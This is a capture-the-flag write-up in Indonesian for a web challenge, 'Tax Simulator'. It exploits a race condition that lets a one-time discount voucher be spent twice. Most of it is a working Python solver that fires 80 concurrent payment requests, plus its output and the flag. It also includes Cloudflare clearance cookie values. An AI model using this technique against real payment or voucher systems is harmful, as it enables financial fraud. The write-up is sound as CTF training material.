# Tax Simulator — Writeup

**Category    :** Web  
**Difficulty  :** Medium  
**Target      :** http://tax.sctf.my.id  
**Target      :** http://tax.sctf.my.id  
**Description :**

Loket pajak ini hanya punya satu petugas.
Ada antrean panjang, dan setiap orang boleh datang dengan voucher diskon — tapi hanya sekali.

Petugas itu jujur, tapi lambat. Ia butuh waktu untuk memproses setiap pengajuan.
Dan selama ia masih memproses... ia belum sempat mencatat bahwa voucher itu sudah dipakai.

Apa yang terjadi kalau kamu datang ke loket lebih dari sekali di saat yang bersamaan?

## Solve

Pertama kita coba akses homepage pakai cookie Cloudflare

```cf
BASE='https://tax.sctf.my.id'
COOKIE='cf_clearance=UaYBSKZFW7zxg3YcrU9X94Ht0.i2AIPCoep8a4R1hcM-1783098909-1.2.1.1-D3lYZ_E3SKcSh83tw8sy7BHWKgeoCeWZ.5bv8z6tS3upqMtqiedXWlYPuSR.953ZPWQA67I.lauDjx_LQ2Z1nGXKX41Hyrjcrom2hIKHyeODnxDs7eitmUmcRY_MHqxpG_hQw0itsVhNQ2JyFI6FZyUDYe1g5rZohIEp2aMVNkgAJYETp27Iosvz5dHyb0qZJpqQ9UvXxIaxT_Te8kw40CkMmMlC_bjfSrQ4JJO8D76MW3oDjSziInqvEGb2r1T1HqsqsaGvjuuzLUEOQlWc05VJ4yjD5VY59kJRFpdBz2HInMJdj06VET2j6N6woazqEMa1X3FgKO1Nb9LxPa5DGauU306pn7rX9Mu1i6PQKkl6NL.mJc9iaCRiAjNxJbX02vyYoiOUWgvVNTROkCrhF4DNMQLZNCHfeI6I6qyxhuROwgbwobWJQA8xJ6rdkW1n'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
mkdir -p taxdump
curl -sS "$BASE/" \
  -H "Cookie: $COOKIE" \
  -H "User-Agent: $UA" \
  -c taxdump/cookies.txt \
  -b taxdump/cookies.txt \
  -o taxdump/index.html
```

Lalu kita download file js nya
```a
curl -sS "$BASE/js/app.js" \
  -H "Cookie: $COOKIE" \
  -H "User-Agent: $UA" \
  -b taxdump/cookies.txt \
  -c taxdump/cookies.txt \
  -o taxdump/js_app.js
```

Kita coba cari endpoint pada file js yang sudah di download
```b
grep -nEi "api|fetch|pay|login|register|flag|voucher" taxdump/js_app.js
```

output
output
```
33:// API Calls
34:async function apiCall(endpoint, method = 'GET', data = null) {
42:    const response = await fetch(endpoint, options);
51:async function handleLogin(e) {
54:    const errorDiv = document.getElementById('login-error');
61:        await apiCall('/api/login', 'POST', {
68:        showToast('Login berhasil');
77:async function handleRegister(e) {
80:    const errorDiv = document.getElementById('register-error');
87:        await apiCall('/api/register', 'POST', {
105:        await apiCall('/api/logout', 'POST');
107:        document.getElementById('login-form').reset();
108:        document.getElementById('register-form').reset();
118:            apiCall('/api/user'),
119:            apiCall('/api/leaderboard')
138:    const voucherCheckbox = document.getElementById('use-voucher');
139:    const voucherBadge = document.getElementById('voucher-badge');
140:    const payBtn = document.getElementById('pay-btn');
142:    if (user.hasVoucher) {
143:        voucherCheckbox.disabled = false;
144:        voucherBadge.style.display = 'inline-block';
145:        voucherBadge.textContent = 'Subsidi Tersedia';
146:        voucherBadge.className = 'badge bg-blue';
148:        voucherCheckbox.disabled = true;
149:        voucherCheckbox.checked = false;
150:        voucherBadge.style.display = 'inline-block';
151:        voucherBadge.textContent = 'Subsidi Habis';
152:        voucherBadge.className = 'badge bg-red';
153:        updatePaymentSummary();
156:    // Set default payment amount to bill
157:    document.getElementById('payment-amount').value = user.bill;
158:    updatePaymentSummary();
160:    // Enable/disable pay button based on bill
162:        payBtn.disabled = true;
163:        payBtn.querySelector('.btn-text').textContent = 'Tagihan Lunas';
165:        payBtn.disabled = false;
166:        payBtn.querySelector('.btn-text').textContent = 'Bayar Sekarang';
213:// Payment Logic
214:function updatePaymentSummary() {
215:    const amountInput = document.getElementById('payment-amount');
216:    const useVoucher = document.getElementById('use-voucher').checked;
219:    const discount = useVoucher ? 50000 : 0;
226:    if (useVoucher) {
233:document.getElementById('payment-amount').addEventListener('input', updatePaymentSummary);
234:document.getElementById('use-voucher').addEventListener('change', updatePaymentSummary);
236:async function handlePayment(e) {
238:    const btn = document.getElementById('pay-btn');
239:    const msgDiv = document.getElementById('payment-msg');
241:    const amount = parseInt(document.getElementById('payment-amount').value);
242:    const useVoucher = document.getElementById('use-voucher').checked;
250:        const result = await apiCall('/api/pay', 'POST', { amount, useVoucher });
257:        if (result.flag) {
258:            document.getElementById('flag-container').style.display = 'block';
259:            document.getElementById('flag-display').textContent = result.flag;
260:            // Scroll to flag
261:            document.getElementById('flag-container').scrollIntoView({ behavior: 'smooth' });
```

Pada file js kita menemukan endpoint

- /api/register
- /api/login
- /api/user
- /api/pay

Lalu karna aplikasi butuh session connect.sid, jadi harus register dan login dulu, jadi kita coba buat solver nya

solver.py
```solver.py
import random
import re
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

BASE_URL = "https://tax.sctf.my.id"
PASSWORD = "P@ssw0rd123"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/149.0.0.0 Safari/537.36"
)
CF_CLEARANCE = "4sBirslbUB8GiIqFnvYNwmeMCYCCJZxFkbvJxviLjQs-1783100869-1.2.1.1-wxGQi7yLgyVBg4kU8XefZzzgghra8euFHEubAlHQBauk2uvk7xZZWogDqca1gWvrySHLReT6ArtzqKb_ixaN6shZmfXXJ_pQQYcaMFBLgcm6pMfVjOPllMa1FfRMk0NmH1GIdgEM.3q3eyGC.x.bAp8g1LX5w7YOzsVRh_5JGmgRiCWXk6EEPxx5cS8szGZbxysLXof8.Y0bLVdmwssjpzJRKCYZ22cHgvJCwNOhdx4jWR3VYT4Yn.GermsIKsPy3hxPhk5Z.oX0SawvaYjSR4AUFpoTOvdGnqv6VfLFu1Y_i_CN0d9ieDy2hpV9e4ZxjEIitUT2HGCCr4jvTZhfJQePKvkWhWZGN5Pszfmos2XrcvxN24bElF7S0gXYVkT5WbScEK5oOxQYz.KS4VMW7atn4qG6wqHP5hQmcnGQ635ICxyd6CkVQL967oQbNZWL"


class TaxClient:
    def __init__(self):
        self.session = self._create_session()

    @staticmethod
    def _create_session():
        session = requests.Session()

        session.headers.update(
            {
                "User-Agent": USER_AGENT,
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
            }
        )

        session.cookies.set(
            "cf_clearance",
            CF_CLEARANCE,
            domain="tax.sctf.my.id",
            path="/",
        )

        return session

    @staticmethod
    def random_username(length=8):
        chars = string.ascii_lowercase + string.digits
        return "jokowi" + "".join(random.choices(chars, k=length))

    @staticmethod
    def extract_flag(text):
        match = re.search(r"SCTF26\{[^}]+\}", text)
        return match.group(0) if match else None

    def register(self, username):
        return self.session.post(
            f"{BASE_URL}/api/register",
            json={
                "username": username,
                "password": PASSWORD,
            },
            timeout=10,
        )

    def login(self, username):
        return self.session.post(
            f"{BASE_URL}/api/login",
            json={
                "username": username,
                "password": PASSWORD,
            },
            timeout=10,
        )

    def profile(self):
        return self.session.get(
            f"{BASE_URL}/api/user",
            timeout=10,
        )

    def clone_session(self):
        cloned = self._create_session()

        for cookie in self.session.cookies:
            cloned.cookies.set(
                cookie.name,
                cookie.value,
                domain=cookie.domain,
                path=cookie.path,
            )

        return cloned


def race_payment(client, payload, worker_id):
    try:
        session = client.clone_session()

        response = session.post(
            f"{BASE_URL}/api/pay",
            json=payload,
            timeout=15,
        )

        return worker_id, response.status_code, response.text

    except Exception as exc:
        return worker_id, "ERR", str(exc)


def main():
    client = TaxClient()

    username = client.random_username()

    print(f"Registering {username}")

    response = client.register(username)
    print(response.status_code, response.text[:200])

    print("Login")

    response = client.login(username)
    print(response.status_code, response.text[:200])

    profile = client.profile()
    print(profile.status_code, profile.text)

    bill = int(profile.json().get("bill", 0))
    payment = {
        "amount": bill,
        "useVoucher": True,
    }

    for round_no in range(1, 8):
        print(f"\nRound {round_no}")

        with ThreadPoolExecutor(max_workers=80) as executor:
            futures = [
                executor.submit(race_payment, client, payment, i)
                for i in range(80)
            ]

            for future in as_completed(futures):
                worker, status, body = future.result()

                print(
                    f"[{worker:02}] {status} "
                    f"{body[:180].replace(chr(10), ' ')}"
                )

                flag = client.extract_flag(body)

                if flag:
                    print(f"\nFLAG FOUND: {flag}")
                    return

        profile = client.profile()

        print(profile.status_code, profile.text)

        flag = client.extract_flag(profile.text)

        if flag:
            print(f"\nFLAG FOUND: {flag}")
            return

        time.sleep(0.5)

    print("\nFlag not found.")


if __name__ == "__main__":
    main()
```

output
```
Registering jokowin7d3zsqg
200 {"message":"Registration successful"}
Login
200 {"message":"Login successful"}
200 {"username":"jokowin7d3zsqg","balance":200000,"bill":150000,"hasVoucher":true,"transactions":[]}

Round 1
[10] 200 {"message":"Payment successful","paidAmount":100000,"voucherApplied":true,"newBalance":100000,"newBill":0,"flag":null}
[57] 400 {"error":"Voucher already used or unavailable"}
[60] 400 {"error":"Voucher already used or unavailable"}
[58] 400 {"error":"Voucher already used or unavailable"}
[56] 400 {"error":"Voucher already used or unavailable"}
[55] 400 {"error":"Voucher already used or unavailable"}
[61] 400 {"error":"Voucher already used or unavailable"}
[70] 400 {"error":"Voucher already used or unavailable"}
[42] 200 {"message":"Payment successful","paidAmount":100000,"voucherApplied":true,"newBalance":0,"newBill":0,"flag":"SCTF26{tax_systems_love_parallel_requests}"}

FLAG FOUND: SCTF26{tax_systems_love_parallel_requests}
```

## Flag

```text
SCTF26{tax_systems_love_parallel_requests}
```
